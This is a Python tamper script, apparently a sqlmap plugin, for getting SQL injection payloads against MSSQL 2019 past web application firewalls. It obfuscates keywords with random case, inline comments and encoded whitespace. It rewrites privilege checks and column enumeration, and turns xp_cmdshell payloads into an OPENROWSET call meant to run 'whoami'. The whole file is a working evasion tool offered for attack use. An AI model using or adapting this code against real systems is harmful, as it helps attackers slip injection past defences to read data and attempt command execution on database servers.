#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2019_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|APPROX_COUNT_DISTINCT|COLLATE|EXTERNAL|LOCATION|SYS\.TABLES|SYS\.COLUMNS|INFORMATION_SCHEMA|COLUMNS|DB_NAME|USER_NAME|XP_CMDSHELL)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "IS_SRVROLEMEMBER" in payload.upper():
        payload = payload.replace("IS_SRVROLEMEMBER('sysadmin')", "APPROX_COUNT_DISTINCT(CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN USER_NAME() END)")

    if "SELECT" in payload.upper():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM", r"SELECT \1 COLLATE Latin1_General_100_CI_AS_SC_UTF8 FROM", payload)

    if "sys.columns" in payload.lower():
        payload = "DECLARE @c TABLE (n NVARCHAR(100)); INSERT INTO @c SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('Users'); SELECT * FROM @c"

    if "xp_cmdshell" in payload.lower():
        payload = "SELECT * FROM OPENROWSET('ODBC', 'Driver={cmd};Command=whoami', '')"

    payload = general_obfuscate(payload)

    return payload
